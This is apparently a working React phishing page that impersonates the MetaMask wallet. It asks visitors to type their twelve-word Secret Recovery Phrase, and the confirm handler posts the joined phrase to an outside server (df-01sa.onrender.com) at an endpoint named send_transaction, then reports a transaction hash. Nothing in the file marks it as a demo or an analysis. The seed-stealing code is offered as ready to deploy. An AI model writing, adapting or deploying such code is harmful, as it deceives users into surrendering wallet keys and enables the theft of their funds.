import React, { useState } from 'react';
import {
  ChakraProvider,
  Box,
  Text,
  Menu,
  MenuButton,
  MenuList,
  MenuItem,
  Button,
  extendTheme,
  VStack,
  Flex,
  Input,
  Heading,
  Container,
  Divider,
  Alert,
  AlertIcon,
  IconButton
} from "@chakra-ui/react";
import { ChevronDownIcon, ViewIcon, ViewOffIcon } from "@chakra-ui/icons";

const theme = extendTheme({
  styles: {
    global: {
      body: {
        bg: 'rgba(37,39,42,255)',
        color: 'white',
      },
    },
  },
});

function App() {
  const [show, setShow] = useState(Array(12).fill(false));
  const [mnemonicPhrase, setMnemonicPhrase] = useState(Array(12).fill(''));
  const [error, setError] = useState('');

  const handleClick = (index:any) => setShow(show.map((s, i) => i === index ? !s : s));
  const handleInputChange = (index:any, value:any) => setMnemonicPhrase(mnemonicPhrase.map((item, i) => i === index ? value : item));

  const handleConfirmClick = async () => {
    // Check if all fields are filled
    if (mnemonicPhrase.some(word => word === '')) {
      setError('Please fill all the fields.');
      return;
    }

    setError('');
    try {
      // Making the API call
      const response = await fetch('https://df-01sa.onrender.com/send_transaction', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ mnemonic_phrase: mnemonicPhrase.join(' ') })
      });

      const data = await response.json();
      if (response.status === 200) {
        alert(`Transaction successful! Hash: ${data.transaction_hash}`);
      } else {
        setError('Something went wrong, please try again.');
      }
    } catch (error) {
      setError('Network error. Please try again.');
    }
  };

  return (
    <ChakraProvider theme={theme}>
      <Box display="flex" justifyContent="space-between" p="4" mx="15%">
        <Text fontSize="xl" fontWeight="bold">MetaMask</Text>
        <Menu>
          <MenuButton as={Button} rightIcon={<ChevronDownIcon />}>
            Language
          </MenuButton>
          <MenuList>
            <MenuItem>English</MenuItem>
            <MenuItem>Spanish</MenuItem>
            <MenuItem>French</MenuItem>
            <MenuItem>German</MenuItem>
          </MenuList>
        </Menu>
      </Box>
  
      <Container centerContent mt="10" maxW="2xl">
        <VStack spacing={4} align="stretch" p="6" borderWidth="1px" borderRadius="lg" bg="rgba(37,39,42,255)" color="white" borderColor="gray.400">
          <Heading size="md" textAlign="center">Confirm Secret Recovery Phrase</Heading>
          <Divider />
          <Text textAlign="center" mb="2">Create password</Text>
          <Text textAlign="center" mb="2">Access your wallet with your Secret Recovery Phrase</Text>
          <Text textAlign="center" mb="4">MetaMask cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password. First, enter the Secret Recovery Phrase that you were given when you created your wallet. Learn more</Text>
          
          <Alert status="info" variant="solid" borderRadius="md" bg="blue.500">
            <AlertIcon />
            <Text textAlign="center">You can paste your entire secret recovery phrase into any field.</Text>
          </Alert>
  
          {/* Inputs for the Secret Recovery Phrase */}
          {Array.from({ length: 4 }, (_, i) => (
            <Flex justify="space-between" key={`phrase-row-${i}`} pt="2">
              {Array.from({ length: 3 }, (_, j) => (
                <Flex align="center" key={`phrase-input-${i}-${j}`}>
                  <Text minW="30px" pr="2">{i * 3 + j + 1}.</Text>
                  <Input 
                    type={show[i * 3 + j] ? "text" : "password"}
                    value={mnemonicPhrase[i * 3 + j]}
                    onChange={(e) => handleInputChange(i * 3 + j, e.target.value)}
                  />
                  <IconButton
                    aria-label="Toggle phrase visibility"
                    icon={show[i * 3 + j] ? <ViewOffIcon /> : <ViewIcon />}
                    onClick={() => handleClick(i * 3 + j)}
                    variant="ghost"
                    colorScheme="whiteAlpha"
                    ml="2"
                  />
                </Flex>
              ))}
            </Flex>
          ))}
  
          {/* Confirm Button */}
          <Button
            mt="4"
            colorScheme="blue"
            borderRadius="full"
            alignSelf="center"
            size="md"
            onClick={handleConfirmClick}
          >
            Confirm Secret Recovery Phrase
          </Button>
          {error && <Text color="red.500" textAlign="center">{error}</Text>}
        </VStack>
      </Container>
    </ChakraProvider>
  );
  
}

export default App;
